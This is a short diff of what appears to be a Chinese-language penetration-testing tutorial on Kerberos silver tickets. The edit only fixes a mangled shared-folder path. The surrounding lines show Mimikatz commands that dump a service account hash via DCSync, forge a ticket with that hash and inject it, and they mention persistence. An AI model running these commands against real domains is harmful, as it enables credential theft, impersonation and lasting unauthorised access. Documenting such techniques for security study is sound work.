@@ -65,8 +65,8 @@ lsadump::dcsync /domain:target.com /user:服务账户名
 kerberos::golden /domain:target.com /sid:域SID /target:server.target.com /service:http /rc4:服务账户哈希 /user:administrator /id:用户RID /ptt
 # 验证
 kerberos::list
-# 使用白银票据
-\\server.targedfolder、
+# 使用白银票据，例如访问共享目录
+\\server.target.com\sharedfolder
 # 有条件的持久化：只要服务账户的哈希没改就可以
 ```
 
